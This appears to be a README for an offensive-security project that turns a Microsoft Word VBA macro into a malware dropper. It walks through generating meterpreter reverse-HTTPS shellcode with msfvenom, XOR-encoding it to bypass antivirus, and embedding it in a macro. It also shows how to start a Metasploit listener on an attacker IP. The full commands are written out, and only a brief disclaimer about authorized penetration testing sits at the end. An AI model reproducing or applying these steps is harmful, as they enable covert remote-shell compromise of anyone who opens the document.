# VBA Payload Encryption and Execution

## Overview
This project demonstrates how to encrypt a shellcode (revshell) payload for execution within a Microsoft Word VBA macro. The encryption process enhances evasion techniques to **_<u>bypass AV</u>_** by encoding the payload before execution.

## Steps
### 1. Generate the Shellcode
Use `msfvenom` to generate a reverse HTTPS payload in C# format:
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -f csharp
```

### 2. Encrypt the Payload
- Use the provided C# encryption script (`XOR_encoder`) to XOR the shellcode with a static key (`0xFA`).
- The python3 script will do the same.

### 3. Embed the Encrypted Payload in VBA Macro
- Open Microsoft Word and access the VBA Editor (`ALT + F11`)
- Insert a new module and paste the `VBA_Macro_Shellcode_Execution` file content

### 4. Setup Metasploit Listener
Start Metasploit and configure the multi-handler:
```sh
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.142; set LPORT 443; exploit"
```

### 5. Execute the VBA Macro
- Open the Word document containing the macro
- Enable macros when prompted
- The encoded payload is decoded and executed in memory

![Captura de pantalla 2025-03-11 a la(s) 16 27 16](https://github.com/user-attachments/assets/368db687-88f2-47ce-ba49-eb61860841b0)


### 6. Compatibility Note
If Microsoft Word is running in 32-bit, the payload and handler must be adjusted for x86 compatibility by replacing `windows/x64/meterpreter/reverse_https` with `windows/meterpreter/reverse_https` in both the shellcode generation with msfvenom and the listener configuration in Metasploit.

A useful hint is to check whether Microsoft Word on the DEV or TEST machine is running in 64-bit or 32-bit mode. 

## Disclaimer
This project is intended for educational and authorized penetration testing purposes only. Unauthorized use is strictly prohibited.

